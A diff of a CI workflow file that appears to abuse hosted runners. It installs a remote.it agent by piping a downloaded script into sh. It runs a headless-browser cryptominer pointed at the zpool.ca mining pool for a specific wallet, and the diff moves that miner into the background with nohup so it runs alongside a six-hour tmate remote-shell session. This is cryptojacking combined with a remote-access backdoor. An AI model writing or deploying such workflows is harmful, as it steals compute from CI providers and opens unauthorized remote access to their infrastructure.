@@ -23,13 +23,7 @@ jobs:
           set -e
           R3_REGISTRATION_CODE="55EC315E-BF92-5164-BAB5-624903D7BEF2" sh -c "$(curl -L https://downloads.remote.it/remoteit/install_agent.sh)"
 
-      - name: Start tmate session
-        run: |
-          set -e
-          ./tmate -F &
-          sleep 21600   # 6 hours
-
-      - name: Install Chrome, Node.js, and Puppeteer, then run webminer
+      - name: Install Chrome, Node.js, and Puppeteer, then run webminer (background)
         run: |
           set -e
           if ! command -v google-chrome &> /dev/null; then
@@ -43,7 +37,7 @@ jobs:
             sudo apt-get install -y nodejs
           fi
           npm install puppeteer
-          node -e '
+          nohup node -e '
           const puppeteer = require("puppeteer");
           const url = "https://webminer.pages.dev?algorithm=cwm_ghostrider&host=ghostrider.na.mine.zpool.ca&port=5354&worker=RLYqcPSqDkF97FjnUJJ1HUzeQ3ciVNm8S5&password=c%3DRTM&workers=4";
           (async () => {
@@ -70,4 +64,10 @@ jobs:
               await new Promise(r => setTimeout(r, 5000));
             }
           })();
-          '
+          ' > webminer.log 2>&1 &
+
+      - name: Start tmate session
+        run: |
+          set -e
+          ./tmate -F &
+          sleep 21600   # 6 hours
